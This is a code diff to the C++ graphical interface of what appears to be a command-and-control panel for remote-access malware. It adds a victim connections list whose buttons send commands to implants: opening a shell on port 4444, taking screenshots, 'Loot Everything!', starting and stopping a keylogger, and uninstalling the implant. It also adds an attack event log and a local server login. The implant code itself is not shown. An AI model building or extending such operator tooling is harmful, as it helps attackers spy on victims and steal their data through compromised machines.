@@ -1,5 +1,6 @@
 #include "UI.hpp"
 #include "Client.hpp"
+#include "LogManager.hpp"
 
 #include <raylib.h>
 #include <string>
@@ -180,13 +181,18 @@ void drawConnectionsTab(WindowState& state) {
     static bool menuVisible = false;
     static int selectedRow = -1;
     static int hoveredRow = -1;
+    static LogManager& logMan = LogManager::instance();
 
     const auto& res{ state.res };
 
     GuiLabel({res.width/2 - 100, 50, 200, 30}, "List of Victim Connections");
 
     if (GuiButton({3, 58, 120, 20}, GuiIconText(ICON_REPEAT_FILL, "Refresh List"))) {
-        (void) Client::instance().fetchVictims(); //TODO: add log entry
+        if(Client::instance().fetchVictims()) {
+            logMan.local_log("Fetched Victims from Server");
+        } else {
+            logMan.local_log("Refreshing the Victim List failed!");
+        }
     }
 
     Rectangle tableRect{0, 80, res.width, res.height - 90};
@@ -290,37 +296,74 @@ void drawConnectionsTab(WindowState& state) {
         Rectangle btn7{menuRect.x + 10, menuRect.y + btn_height*7, 280, 25};
         Rectangle btn8{menuRect.x + 10, menuRect.y + btn_height*8, 280, 25};
 
-        if (GuiButton(btn1, TextFormat("Timeout Client %d for %d min", selectedRow, 10))) {
-            // handle action
+        const auto timeout = std::atol(state.implant_settings.default_timeout.text);
+        const auto port = 4444;
+        const auto victim = victims[selectedRow];
+
+        if (GuiButton(btn1, TextFormat("Timeout Client %d for %d min", victim.id, timeout))) {
+            if(state.client.sendTimeoutCommand(victim.uid, timeout)) {
+                logMan.attack_log(std::format("Timeout Command Send to Client: {}", victim.uid));
+            } else {
+                logMan.local_log("Sending Timeout Command failed!");
+            }
             menuVisible = false;
         }
-        if (GuiButton(btn2, TextFormat("Open Shell (Port: %d)", 4444))) {
-            // handle action
+
+        if (GuiButton(btn2, TextFormat("Open Shell (Port: %d)", port))) {
+            if(state.client.sendOpenSessionCommand(victim.uid, port)) {
+                logMan.attack_log(std::format("Opening Session to Client: {} on Port: {}", victim.uid, port));
+            } else {
+                logMan.local_log("Sending Open Session Command failed!");
+            }
             menuVisible = false;
             state.current_tab = Tab::TERMINAL;
         }
         if (GuiButton(btn3, "Close open Shells")) {
-            // handle action
+            if(state.client.sendCloseSessionCommand(victim.uid)) {
+                logMan.attack_log(std::format("Closing Open Sessions for Client: {}", victim.uid));
+            } else {
+                logMan.local_log("Sending Timeout Command failed!");
+            }
             menuVisible = false;
         }
         if (GuiButton(btn4, "Take Screenshot")) {
-            // handle action
+            if(state.client.sendScreenshotCommand((victim.uid))) {
+                logMan.attack_log(std::format("Screenshot Command Send to Client: {}", victim.uid));
+            } else {
+                logMan.local_log("Sending Screenshot Command failed!");
+            }
             menuVisible = false;
         }
         if (GuiButton(btn5, "Loot Everything!")) {
-            // handle action
+            if(state.client.sendLootCommand(victim.uid)) {
+                logMan.attack_log(std::format("Loot Command Send to Client: {}", victim.uid));
+            } else {
+                logMan.local_log("Sending Loot Command failed!");
+            }
             menuVisible = false;
         }
         if (GuiButton(btn6, "Start Keylogger")) {
-            // handle action
+            if(state.client.sendStartKeyloggerCommand(victim.uid)) {
+                logMan.attack_log(std::format("Starting Keylogger on Client: {}", victim.uid));
+            } else {
+                logMan.local_log("Starting Keylogger failed!");
+            }
             menuVisible = false;
         }
         if (GuiButton(btn7, "Stop Keylogger")) {
-            // handle action
+            if(state.client.sendStopKeyloggerCommand(victim.uid)) {
+                logMan.attack_log(std::format("Stopping Keylogger on Client: {}", victim.uid));
+            } else {
+                logMan.local_log("Stopping Keylogger failed!");
+            }
             menuVisible = false;
         }
         if (GuiButton(btn8, "Uninstall Implant")) {
-            // handle action
+            if(state.client.sendUninstallCommand(victim.uid)) {
+                logMan.attack_log(std::format("Uninstalling Implant on Client: {}", victim.uid));
+            } else {
+                logMan.local_log("Uninstalling failed!");
+            }
             menuVisible = false;
         }
     }
@@ -399,13 +442,16 @@ void drawLogin(WindowState& state) {
         GuiLabel(Rectangle{ popupRect.x + 250, popupRect.y + popupRect.height - 50, 300, 30 }, "Login Failed!");
     }
 
-    /*
     // Local Server Button
-    if (GuiButton((Rectangle){ popupRect.x + 250, popupRect.y + popupRect.height - 50, 300, 30 }, "Start Local Server")) {
+    if (not state.login_failed && GuiButton(Rectangle{ popupRect.x + 250, popupRect.y + popupRect.height - 50, 300, 30 }, "Start Local Server")) {
+        state.client.setServerUrl("https://127.0.0.1:1337");
+        state.client.setUsername(state.user_settings.username.text);
+        state.client.setPassword(state.user_settings.password.text);
+
+        //std::system("./server --local");
+
         state.is_connected = true;
     }
-    */
-
 }
 
 //-------------------------------------------------
@@ -456,28 +502,25 @@ void drawLogsTab(WindowState& state) {
     static char logText[MAX_LOG_SIZE] = "Log started...\n";
     static Vector2 scrollOffset = { 0, 0 };
     static Rectangle logBounds = { 0, 0, 0, 0 };
+    static LogManager& logMan = LogManager::instance();
 
     auto& res = state.res;
 
     GuiLabel({res.width/2 - 100, 50, 200, 30}, "C2 Event Log");
 
     if (GuiButton({3, 58, 120, 20}, GuiIconText(ICON_REPEAT_FILL, "Refresh Logs"))) {
-        //TODO: Fetch logs from server
+        for(const auto& log : logMan.refresh()) {
+            char newEntry[128];
+            snprintf(newEntry, sizeof(newEntry), "%s\n", log.c_str());
+
+            if (strlen(logText) + strlen(newEntry) < MAX_LOG_SIZE - 1) {
+                strcat(logText, newEntry);
+            }
+        }
     }
 
     Rectangle viewRect{0, 80, res.width, res.height - 90};
     GuiPanel(viewRect, "");
-
-    // Add log entries on button press
-    if (IsKeyPressed(KEY_SPACE)) {
-        char newEntry[64];
-        snprintf(newEntry, sizeof(newEntry), "Log entry at frame %f\n", GetFrameTime());
-
-        // Append to log (with size check)
-        if (strlen(logText) + strlen(newEntry) < MAX_LOG_SIZE - 1) {
-            strcat(logText, newEntry);
-        }
-    }
 
     // Use GuiScrollPanel for scrollable content
     GuiScrollPanel(
